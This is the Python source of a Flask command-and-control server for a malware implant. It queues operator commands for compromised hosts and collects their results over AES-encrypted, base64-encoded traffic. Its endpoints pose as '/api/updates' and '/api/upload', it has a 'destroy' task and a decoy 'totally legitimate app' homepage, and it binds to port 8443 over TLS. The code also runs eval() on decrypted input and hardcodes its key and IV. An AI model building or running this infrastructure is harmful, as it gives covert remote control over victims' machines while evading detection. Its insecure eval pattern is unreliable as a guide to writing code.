"""Command and Control HTTP server for communicating with implant"""

import base64
from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
tasks = []
results = []

SECRET_KEY = b"deadbeefbananana"
IV = b"randominitvector"


def encrypt_data(data):
    # encrypt with AES and encode with base64 into "data" param
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    b64 = base64.b64encode(ct_bytes).decode()
    return "data=" + b64


def decrypt_data(data):
    # decode base64 from "data" param and decrypt with AES
    b64 = data.replace("data=", "")
    ct = base64.b64decode(b64)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()


@app.route("/api/updates", methods=["POST"])
def beacon():
    # when implant requests this endpoint, send its tasks
    enc = request.get_data().decode()
    plain = decrypt_data(enc)
    print("BEACON\n", plain)

    response = encrypt_data(str({"tasks": tasks}))
    # clear after sending
    tasks.clear()
    return response


@app.route("/api/upload", methods=["POST"])
def result():
    # implant uses this endpoint to upload results of tasks
    enc = request.get_data().decode()
    plain = decrypt_data(enc)
    print("RESULT\n", plain)
    json_data = eval(plain)

    output = json_data.get("result")
    results.append(output)
    return encrypt_data("ok")


@app.route("/task", methods=["POST"])
def task():
    # operator calls this endpoint with "cmd" param to add task
    data = request.json
    print("DATA\n", data)
    command = data.get("cmd")

    tasks.append(command)
    return jsonify({"status": "task added"})


@app.route("/destroy", methods=["POST"])
def destroy():
    # operator calls this to replace all tasks with final "destroy" task
    tasks.clear()
    tasks.append("destroy")
    return jsonify({"status": "sent destroy task"})


@app.route("/view")
def view_results():
    # operator calls this endpoint to view results
    return jsonify(results)


@app.route("/")
def show_homepage():
    return "totally legitimate app, nothing to see here\n"


if __name__ == "__main__":
    context = ("cert/server.crt", "cert/server.key")
    app.run(host="0.0.0.0", port=8443, ssl_context=context)
